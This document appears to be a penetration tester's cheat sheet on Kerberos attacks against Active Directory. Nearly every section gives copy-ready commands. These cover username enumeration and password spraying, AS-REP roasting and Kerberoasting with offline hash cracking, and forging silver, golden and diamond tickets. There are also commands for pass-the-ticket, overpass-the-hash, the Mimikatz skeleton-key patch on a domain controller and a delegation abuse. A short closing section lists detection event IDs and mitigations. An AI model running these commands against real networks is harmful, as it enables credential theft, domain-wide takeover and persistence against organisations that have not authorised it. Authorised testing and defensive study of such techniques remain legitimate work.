# Kerberos Attacks

## Table of Contents
- [[#Kerberos Overview|Kerberos Overview]]
- [[#Kerbrute — User Enumeration|Kerbrute — User Enumeration]]
- [[#AS-REP Roasting|AS-REP Roasting]]
- [[#Kerberoasting|Kerberoasting]]
- [[#Silver Ticket|Silver Ticket]]
- [[#Golden Ticket|Golden Ticket]]
- [[#Diamond Ticket|Diamond Ticket]]
- [[#Pass-the-Ticket (PtT)|Pass-the-Ticket (PtT)]]
- [[#Overpass-the-Hash|Overpass-the-Hash]]
- [[#Skeleton Key|Skeleton Key]]
- [[#Kerberos Delegation Attacks|Kerberos Delegation Attacks]]
- [[#Tool Comparison|Tool Comparison]]
- [[#Detection & Mitigation|Detection & Mitigation]]
- [[#Related Notes|Related Notes]]

---

## Kerberos Overview

Kerberos is the default authentication protocol in Active Directory.

### Key Concepts

| Term | Description |
|------|-------------|
| **KDC** | Key Distribution Center (Domain Controller) |
| **TGT** | Ticket Granting Ticket — proof of authentication |
| **TGS** | Ticket Granting Service — service access ticket |
| **AS** | Authentication Service |
| **KRBTGT** | Domain account that encrypts/signs all TGTs |
| **SPN** | Service Principal Name — identifies a service instance |
| **PAC** | Privilege Attribute Certificate — user/group membership |

### Authentication Flow

```text
1. User → AS:     "I'm user@domain.local" (encrypted with user's NTLM hash)
2. KDC → User:    TGT (encrypted with KRBTGT hash) + Session Key
3. User → TGS:    "I want access to service/SPN" + TGT
4. KDC → User:    TGS (encrypted with service account's NTLM hash)
5. User → Service: TGS
6. Service → User: Access granted (or denied)
```

---

## Kerbrute — User Enumeration

Kerbrute performs **pre-authentication** Kerberos requests to enumerate valid usernames. Since Kerberos requires the user to exist to even begin the exchange, this is a stealthy way to discover accounts.

### Why Kerbrute?

- No LDAP/SMB connection needed (firewall friendly)
- Uses Kerberos on port 88 (often open)
- No logs in Windows Event Viewer as a traditional login
- Fast — can check thousands of users per second

### User Enumeration

```bash
# Basic enumeration
kerbrute userenum -d domain.local --dc 10.10.14.3 usernames.txt

# With output file
kerbrute userenum -d domain.local --dc 10.10.14.3 usernames.txt -o valid_users.txt

# With delay (stealth)
kerbrute userenum -d domain.local --dc 10.10.14.3 usernames.txt -d 100

# Domain controller by IP
kerbrute userenum -d domain.local --dc 10.10.14.3 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### Password Spraying

```bash
# Single password against multiple users
kerbrute passwordspray -d domain.local --dc 10.10.14.3 valid_users.txt 'Welcome1'

# With verbose
kerbrute passwordspray -d domain.local --dc 10.10.14.3 valid_users.txt 'Fall2024!' -v
```

---

## AS-REP Roasting

If a user account has **"Do not require Kerberos pre-authentication"** enabled, an attacker can request authentication data for that user without their password.

### Identify Vulnerable Users

```bash
# Using Impacket
impacket-GetNPUsers -dc-ip 10.10.14.3 -no-pass -usersfile users.txt domain.local/

# Using LDAP search
ldapsearch -H ldap://10.10.14.3 -D 'DOMAIN\user' -w 'password' -b "dc=domain,dc=local" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" cn
```

### Extract AS-REP Hash

```bash
# Single user (known username)
impacket-GetNPUsers -dc-ip 10.10.14.3 -request domain.local/username

# All users in file
impacket-GetNPUsers -dc-ip 10.10.14.3 -request -usersfile users.txt domain.local/ -format hashcat

# With credentials (domain authenticated)
impacket-GetNPUsers -dc-ip 10.10.14.3 -request domain.local/user:password

# Output to file
impacket-GetNPUsers -dc-ip 10.10.14.3 -request domain.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
```

### Using Rubeus (on Windows)

```powershell
# AS-REP Roast
.\Rubeus.exe asreproast

# With specific user
.\Rubeus.exe asreproast /user:username /format:hashcat /outfile:hashes.txt

# AS-REP Roast all users
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

### Crack the Hash

```bash
# Hashcat (mode 18200)
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# John
john --format=krb5asrep asrep_hashes.txt --wordlist=rockyou.txt
```

---

## Kerberoasting

Request TGS tickets for service accounts (accounts with SPNs). The ticket is encrypted with the service account's NTLM hash, which can be cracked offline.

### Requirements
- Valid domain credentials (any domain user)
- Network access to a Domain Controller
- Service accounts with SPNs registered

### Using Impacket

```bash
# Basic Kerberoasting (with password)
impacket-GetUserSPNs -dc-ip 10.10.14.3 domain.local/user:password -request

# Output to file (hashcat format)
impacket-GetUserSPNs -dc-ip 10.10.14.3 domain.local/user:password -request -outputfile kerb_hashes.txt

# List SPNs without requesting tickets
impacket-GetUserSPNs -dc-ip 10.10.14.3 domain.local/user:password

# With RC4 (faster cracking)
impacket-GetUserSPNs -dc-ip 10.10.14.3 domain.local/user:password -request -outputfile kerb_hashes.txt
```

### Using Rubeus (on Windows)

```powershell
# Kerberoast all
.\Rubeus.exe kerberoast /outfile:kerb_hashes.txt

# Kerberoast specific user
.\Rubeus.exe kerberoast /user:svc_account /outfile:hashes.txt

# With RC4
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

# With LDAPS (stealth)
.\Rubeus.exe kerberoast /ldaps /outfile:hashes.txt
```

### Using PowerShell

```powershell
# Native PowerShell Kerberoasting
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dc.domain.local:1433"
```

### Crack the Hash

```bash
# Hashcat (mode 13100)
hashcat -m 13100 -a 0 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 -a 0 kerb_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John
john --format=krb5tgs kerb_hashes.txt --wordlist=rockyou.txt
```

### Targeted Kerberoasting

If you have a specific high-value SPN:

```bash
# Request specific SPN
impacket-GetUserSPNs -dc-ip 10.10.14.3 -request -spn "MSSQLSvc/SQL01.domain.local:1433" domain.local/user:password
```

---

## Silver Ticket

A **Silver Ticket** is a forged TGS ticket that grants access to a **specific service**. It's encrypted with the service account's NTLM hash (not KRBTGT).

### Requirements
- Service account NTLM hash (or password plaintext)
- Domain SID
- Service SPN
- Target service type (cifs, http, ldap, winrm, etc.)

### Generate Silver Ticket (Impacket)

```bash
# Get domain SID
impacket-lookupsid domain.local/user:password@10.10.14.3 | grep "SID"
# Or: Get-ADDomain | Select DomainSID

# Generate silver ticket for CIFS (file share access)
impacket-ticketer -nthash <NTLM_HASH> -domain-sid <DOMAIN_SID> -domain domain.local -spn cifs/target.domain.local Administrator

# For HTTP (IIS access)
impacket-ticketer -nthash <NTLM_HASH> -domain-sid <DOMAIN_SID> -domain domain.local -spn http/webserver.domain.local Administrator

# For LDAP (DC access)
impacket-ticketer -nthash <NTLM_HASH> -domain-sid <DOMAIN_SID> -domain domain.local -spn ldap/dc.domain.local Administrator

# For HOST (schedule tasks)
impacket-ticketer -nthash <NTLM_HASH> -domain-sid <DOMAIN_SID> -domain domain.local -spn host/dc.domain.local Administrator

# For MSSQL
impacket-ticketer -nthash <NTLM_HASH> -domain-sid <DOMAIN_SID> -domain domain.local -spn mssqlsvc/sql.domain.local:1433 Administrator
```

### Use Silver Ticket

```bash
# Import ticket (on Linux)
export KRB5CCNAME=/path/to/ticket.ccache

# Access CIFS
smbclient -k //target.domain.local/share -c 'ls'

# Access with impacket
impacket-psexec -k -no-pass domain.local/Administrator@target.domain.local

# WinRM
impacket-wmiexec -k -no-pass domain.local/Administrator@target.domain.local
```

### Using Mimikatz (on Windows)

```mimikatz
# Generate silver ticket
kerberos::golden /domain:domain.local /sid:S-1-5-21-... /target:dc.domain.local /service:cifs /rc4:<NTLM_HASH> /user:Administrator /ptt

# Common service types:
# cifs  — File shares
# http  — IIS/Web
# ldap  — LDAP/AD queries
# host  — Task Scheduler
# rpcss — RPC
# winrm — PowerShell Remoting
# mssqlsvc — MSSQL
```

### Service Naming Reference

| Service | SPN Format | Access |
|---------|-----------|--------|
| CIFS | `cifs/target.domain.local` | File shares, admin shares |
| HTTP | `http/target.domain.local` | Web access, WinRM |
| LDAP | `ldap/dc.domain.local` | Directory access |
| HOST | `host/dc.domain.local` | Scheduled tasks |
| WINRM | `WSMAN/target.domain.local` | PowerShell remoting |
| MSSQL | `MSSQLSvc/sql.domain.local:1433` | SQL Server |
| RPCSS | `RPCSS/dc.domain.local` | RPC services |
| TERMSRV | `TERMSRV/target.domain.local` | Remote Desktop |
| WWW | `www/target.domain.local` | Web services |

---

## Golden Ticket

A **Golden Ticket** is a forged TGT that gives **domain admin access** to everything. It's encrypted with the **KRBTGT** account's NTLM hash — the most privileged account in the domain.

### Requirements
- KRBTGT account NTLM hash
- Domain SID
- (Optional) Target user — usually Administrator

### Extract KRBTGT Hash

```bash
# From Domain Controller (Domain Admin required)
impacket-secretsdump domain.local/Administrator:password@10.10.14.3

# Look for: krbtgt:<RID>:<LM>:<NTLM>:::
```

### Generate Golden Ticket (Impacket)

```bash
# Basic golden ticket
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain domain.local Administrator

# With user/group IDs
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain domain.local -user-id 500 -groups 512,513,518,519,520 Administrator

# With extra SIDs (for Enterprise Admin access)
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain domain.local -extra-sid "S-1-5-21-....-519" Administrator
```

### Use Golden Ticket

```bash
# Set ticket file
export KRB5CCNAME=/path/to/ticket.ccache

# Access any resource as domain admin
smbclient -k //dc.domain.local/C$
impacket-psexec -k -no-pass domain.local/Administrator@dc.domain.local
impacket-wmiexec -k -no-pass domain.local/Administrator@dc.domain.local
```

### Using Mimikatz (on Windows)

```mimikatz
# Generate golden ticket
kerberos::golden /domain:domain.local /sid:S-1-5-21-... /rc4:<KRBTGT_NTLM_HASH> /user:Administrator /ptt

# With groups (includes Domain Admins)
kerberos::golden /domain:domain.local /sid:S-1-5-21-... /rc4:<KRBTGT_NTLM_HASH> /user:Administrator /groups:512 /ptt

# Verify ticket
kerberos::list

# Access DC
dir \\dc.domain.local\C$
```

### Golden Ticket Lifetime

```mimikatz
# Default: 10 years (with Mimikatz)
kerberos::golden /domain:domain.local /sid:... /rc4:... /user:Administrator /ptt /endin:600

# /endin = lifetime in minutes
# If no /endin specified, Mimikatz sets 10 years
```

> [!warning]
> Golden tickets give full domain access. The KRBTGT password should be changed twice (with a 10-hour wait between) to invalidate existing golden tickets.

---

## Diamond Ticket

A **Diamond Ticket** is a more stealthy alternative to a Golden Ticket. Instead of forging a TGT from scratch, you modify an **existing TGT** (encrypted with KRBTGT) and crack/re-encrypt it.

### Advantages over Golden Ticket
- Harder to detect (modified legitimate ticket vs forged)
- Uses the correct encryption (AES vs RC4)
- Bypasses some detection mechanisms

### Using Rubeus

```powershell
# Diamond ticket creation
.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:krbtgt_aes_key /nowrap
```

---

## Pass-the-Ticket (PtT)

Use a stolen TGT/TGS ticket to authenticate as another user.

### Extract Tickets (Mimikatz)

```mimikatz
# Export all tickets
sekurlsa::tickets /export

# Extract from Kerberos cache
kerberos::list /export
```

### Pass the Ticket

```mimikatz
# Import a ticket
kerberos::ptt ticket.kirbi

# Verify
kerberos::list
```

### Using Impacket

```bash
# Convert ccache to kirbi and back
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi

# Use ticket with impacket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain.local/Administrator@dc.domain.local
```

### Using Rubeus

```powershell
# Pass the ticket
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Ask TGT and inject (ask for new ticket)
.\Rubeus.exe asktgt /user:Administrator /rc4:<NTLM_HASH> /ptt
```

---

## Overpass-the-Hash

Use an NTLM hash to request a TGT (without needing the plaintext password).

### Using Rubeus

```powershell
# Overpass-the-hash (ask TGT with NTLM hash)
.\Rubeus.exe asktgt /domain:domain.local /user:Administrator /rc4:<NTLM_HASH> /ptt

# With AES key
.\Rubeus.exe asktgt /domain:domain.local /user:Administrator /aes256:<AES_KEY> /ptt

# With output to file
.\Rubeus.exe asktgt /domain:domain.local /user:Administrator /rc4:<NTLM_HASH> /outfile:ticket.kirbi
```

### Using Impacket

```bash
# Overpass-the-hash then execute
impacket-psexec -hashes <LM>:<NTLM> domain.local/Administrator@10.10.14.3
impacket-wmiexec -hashes <LM>:<NTLM> domain.local/Administrator@10.10.14.3
```

---

## Skeleton Key

A **Skeleton Key** is a persistence technique (Mimikatz) that patches the Domain Controller so any password works for any account.

```mimikatz
# On Domain Controller (need DA)
privilege::debug
misc::skeleton

# Now any account can authenticate with password "mimikatz"
net use \\dc.domain.local\C$ /user:Administrator mimikatz
```

> [!warning]
> Skeleton key is a Kernel-mode patch — it's very noisy and requires the DC to not reboot.

---

## Kerberos Delegation Attacks

### Unconstrained Delegation

```bash
# Find computers with unconstrained delegation
impacket-findDelegation -dc-ip 10.10.14.3 domain.local/user:password

# Using AD module
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

### Constrained Delegation

```bash
# Find users with constrained delegation
impacket-findDelegation -dc-ip 10.10.14.3 domain.local/user:password
```

### Resource-Based Constrained Delegation (RBCD)

```bash
# RBCD attack
impacket-rbcd -action write -delegate-from ATTACKER$ -delegate-to TARGET$ -dc-ip 10.10.14.3 domain.local/user:password
```

---

## Tool Comparison

| Tool | Platform | Use Case |
|------|----------|----------|
| **Impacket** | Linux | All Kerberos attacks (GetNPUsers, GetUserSPNs, ticketer, secretsdump) |
| **Rubeus** | Windows | Kerberoast, AS-REP, Overpass-the-hash, Pass-the-ticket, Diamond ticket |
| **Mimikatz** | Windows | Golden/Silver tickets, Pass-the-ticket, Skeleton key |
| **Kerbrute** | Linux | User enumeration, password spraying |
| **PowerShell** | Windows | ADUser queries, Kerberos ticket requests |

---

## Detection & Mitigation

### Detection

| Attack | Detection Method | Event IDs |
|--------|-----------------|-----------|
| Kerberoasting | Event ID 4769 with RC4 encryption | 4769 |
| AS-REP Roast | Event ID 4768 without pre-auth | 4768 |
| Golden Ticket | Anomalous TGT lifetime, source | 4624, 4672 |
| Silver Ticket | Event ID 4624, 4634 with anomalous patterns | 4624 |
| Kerbrute | Failed Kerberos pre-auth (rare) | 4771 |

### Mitigation

1. **Group Managed Service Accounts (gMSA)** — automatic password rotation
2. **Strong service account passwords** — 25+ characters
3. **Disable RC4 encryption** — use only AES (slows cracking)
4. **Enable pre-authentication** — check all user accounts
5. **Rotate KRBTGT password** — twice with 10-hour interval after compromise
6. **Monitor Event ID 4769** — look for unusual TGS requests
7. **Use managed service accounts** — reduces static SPN count
8. **Restrict delegation** — use constrained delegation only when required

---

## Related Notes

- [[04 - Password Attacks/Bruteforce Tools Reference]]
- [[04 - Password Attacks/4.1 Online Attacks/Online Password Attacks]]
- [[04 - Password Attacks/4.2 Offline Attacks/Offline Password Attacks]]
- [[04 - Password Attacks/4.3 Hash Cracking/Hash Cracking Reference]]
- [[02 - Active Directory/AD Attack Paths]]
